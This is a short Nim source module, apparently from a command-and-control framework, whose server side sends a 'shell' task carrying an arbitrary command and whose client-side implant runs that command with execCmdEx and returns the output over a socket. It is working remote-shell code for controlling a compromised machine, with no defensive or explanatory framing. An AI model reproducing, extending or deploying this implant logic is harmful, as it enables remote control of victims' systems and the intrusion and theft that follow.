when defined(server):
    import asyncdispatch, json
    import ../server/[types, communication]

when defined(client):
    import osproc, os, net
    import ../client/communication

when defined(server):
    proc sendTask*(client: C2Client, cmd: string) {.async.} =
        let j = %*
            {
                "task": "shell",
                "shellCmd": cmd
            }
        await client.sendClientTask($j)

when defined(client):
    proc executeTask*(socket: Socket, toExec: string) =
        try:
            let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir())
            socket.sendOutput("CMD", output)
        except OSError:
            socket.sendOutput("CMD", getCurrentExceptionMsg())
